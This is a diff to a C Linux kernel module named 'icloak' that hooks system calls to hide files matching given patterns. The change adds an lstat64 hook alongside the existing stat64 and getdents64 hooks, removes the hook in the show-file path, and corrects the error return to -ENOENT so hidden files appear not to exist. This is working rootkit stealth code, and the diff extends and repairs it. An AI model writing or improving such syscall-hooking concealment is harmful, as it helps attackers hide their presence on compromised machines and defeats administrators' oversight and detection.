@@ -16,6 +16,8 @@ asmlinkage long (*getdents64_syscall)(unsigned int fd, struct linux_dirent64 __u
 
 asmlinkage long (*stat64_syscall)(const char __user *filename, struct stat64 __user *statbuf) = NULL;
 
+asmlinkage long (*lstat64_syscall)(const char __user *filename, struct stat64 __user *statbuf) = NULL;
+
 static icloak_filename_pattern_ctx *g_icloak_hidden_patterns = NULL, *g_icloak_hidden_patterns_tail = NULL;
 
 static struct mutex g_icloak_hidden_patterns_mtx;
@@ -66,6 +68,10 @@ int native_hide_file(const char *pattern) {
         kook(__NR_stat64, icloak_stat64, (void **)&stat64_syscall);
     }
 
+    if (lstat64_syscall == NULL) {
+        kook(__NR_lstat64, icloak_lstat64, (void **)&lstat64_syscall);
+    }
+
     lock_hidden_patterns_mutex(return 1);
 
     g_icloak_hidden_patterns = icloak_add_filename_pattern(g_icloak_hidden_patterns,
@@ -98,6 +104,12 @@ int native_show_file(const char *pattern) {
         if (stat64_syscall != NULL) {
             if (kook(__NR_stat64, stat64_syscall, NULL) == 0) {
                 stat64_syscall = NULL;
+            }
+        }
+
+        if (lstat64_syscall != NULL) {
+            if (kook(__NR_lstat64, lstat64_syscall, NULL) == 0) {
+                lstat64_syscall = NULL;
             }
         }
 
@@ -168,8 +180,12 @@ asmlinkage long icloak_stat64(const char __user *filename, struct stat64 __user 
     unlock_hidden_patterns_mutex
 
     if (matches) {
-        return ENOENT;
+        return -ENOENT;
     }
 
     return stat64_syscall(filename, statbuf);
+}
+
+asmlinkage long icloak_lstat64(const char __user *filename, struct stat64 __user *statbuf) {
+    return icloak_stat64(filename, statbuf);
 }
